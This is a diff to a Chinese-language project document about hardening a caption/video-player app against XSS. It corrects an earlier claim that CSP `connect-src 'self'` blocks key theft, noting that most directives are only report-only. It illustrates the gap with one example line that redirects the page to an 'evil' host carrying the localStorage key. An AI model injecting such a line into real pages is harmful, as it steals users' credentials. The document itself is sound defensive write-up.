@@ -76,7 +76,14 @@ Caption track 有四個層級，每層是不同的題目（詳見 [docs/handoff-
   字幕全程走 `textContent`；修掉兩條同類鏈路 —— 字幕→`failReason`→`/watch` 的 innerHTML
   （文字位置，08-21）、標題→`title='…'`→`/admin`（**屬性位置**，09-04：`esc()` 原本不跳脫引號）。
   兩條的終點都是同源 localStorage 裡的 INGEST_KEY。
-  另加 `?key=` 只認頁面路由、HTML 安全標頭 + CSP（`connect-src 'self'` 讓被注入的腳本也送不出去）。
+  另加 `?key=` 只認頁面路由、HTML 安全標頭 + CSP。
+  ⚠️ **CSP 要說清楚**：真正**強制**的只有 `object-src` / `base-uri` / `form-action` /
+  `frame-ancestors` 四條；`default-src` / `script-src` / `connect-src` / `img-src` /
+  `frame-src` 那組還在 **Report-Only**（`CSP_CANDIDATE`，見 `worker/src/index.ts`），
+  沒有強制力。而且就算把它們轉成強制，`connect-src 'self'` **也擋不住導航式外送** ——
+  `location = 'https://evil/?k=' + localStorage.getItem('ytplayer-key')` 不受
+  `connect-src` 管（那是 `navigate-to`，而它已從 CSP 規範移除、瀏覽器都沒實作）。
+  CSP 在這裡是縱深，不是金鑰外洩的防線；防線是「頁面本來就沒有第三方腳本」。
   **讀取面也收斂過**：`status.json` 公開版只給進度、`/health` 的用量要 key、
   `source.json` 移出公開白名單。
   一頁圖：[attack-surface.html](docs/attack-surface.html)；推導：[§5](docs/privacy-hardening.md)
